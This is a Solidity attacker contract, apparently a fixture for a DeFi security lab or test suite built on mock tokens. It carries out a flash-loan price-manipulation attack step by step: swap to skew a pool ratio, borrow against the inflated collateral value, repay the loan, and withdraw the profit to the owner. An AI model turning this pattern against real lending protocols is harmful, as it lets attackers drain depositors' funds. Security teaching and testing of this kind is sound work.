// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../../../../shared/contracts/MockERC20.sol";

interface IPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
    function swap(address tokenIn, uint256 amountIn) external returns (uint256);
}

interface ILending {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
}

/**
 * @title FlashLoanAttacker
 * @notice Flash loan -> swap to manipulate pool ratio -> borrow at inflated collateral value -> profit
 */
contract FlashLoanAttacker {
    address public owner;
    IPool public pool;
    ILending public lending;
    MockERC20 public tokenA;
    MockERC20 public tokenB;

    constructor(address _pool, address _lending, address _tokenA, address _tokenB) {
        owner = msg.sender;
        pool = IPool(_pool);
        lending = ILending(_lending);
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
    }

    function attack(uint256 flashAmount) external {
        require(msg.sender == owner, "Not owner");

        // Initiate flash loan of tokenA
        bytes memory callback = abi.encodeWithSignature("onFlashLoan()");
        pool.flashLoan(address(tokenA), flashAmount, callback);
    }

    function onFlashLoan() external {
        uint256 balance = tokenA.balanceOf(address(this));

        // Step 1: Massive swap to manipulate price ratio
        tokenA.approve(address(pool), balance);
        uint256 received = pool.swap(address(tokenA), balance / 2);

        // Step 2: Deposit remaining tokenA as collateral
        uint256 collateralAmount = tokenA.balanceOf(address(this));
        tokenA.approve(address(lending), collateralAmount);
        lending.depositCollateral(collateralAmount);

        // Step 3: Borrow at inflated valuation
        lending.borrow(received / 2);

        // Step 4: Swap back to repay flash loan
        tokenB.approve(address(pool), received);
        pool.swap(address(tokenB), received);

        // Step 5: Repay flash loan (return original tokenA)
        tokenA.transfer(address(pool), balance);
    }

    function withdraw(address token) external {
        require(msg.sender == owner, "Not owner");
        MockERC20(token).transfer(owner, MockERC20(token).balanceOf(address(this)));
    }
}
